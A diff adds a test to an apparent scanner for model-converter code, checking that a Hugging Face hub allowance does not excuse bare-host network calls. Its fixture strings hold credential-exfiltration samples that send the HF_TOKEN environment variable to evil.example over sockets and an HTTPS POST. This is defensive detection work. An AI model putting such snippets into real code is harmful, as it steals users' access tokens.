@@ -3127,6 +3127,41 @@ def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
     )
 
 
+def test_a_host_based_network_api_refuses_the_hub_allowance():
+    """The allowance reads URLs, and two of the sinks the network rule recognises
+    do not take one. socket.create_connection(("evil.example", 443)) and
+    http.client.HTTPSConnection("evil.example") name their destination as a bare
+    host, so a file could carry a hub URL, open one of those beside it, and the
+    allowance would call that talking only to the hub.
+    """
+    scan_converter_source = _load(
+        "converter_scan_host_api_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    for body in (
+        'import os\nimport socket\n' + hub
+        + 'socket.create_connection(("evil.example", 443))'
+        + '.send(os.environ["HF_TOKEN"].encode())\n',
+        'import os\nimport http.client\n' + hub
+        + 'c = http.client.HTTPSConnection("evil.example")\n'
+        + 'c.request("POST", "/", os.environ["HF_TOKEN"])\n',
+        'import os\nimport socket\n' + hub
+        + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
+        + 's.send(os.environ["HF_TOKEN"].encode())\n',
+    ):
+        assert any(
+            "Harvests environment variables" in f.check
+            for f in scan_converter_source(body)
+        ), body
+
+    # The URL-based shape the allowance is for still passes.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
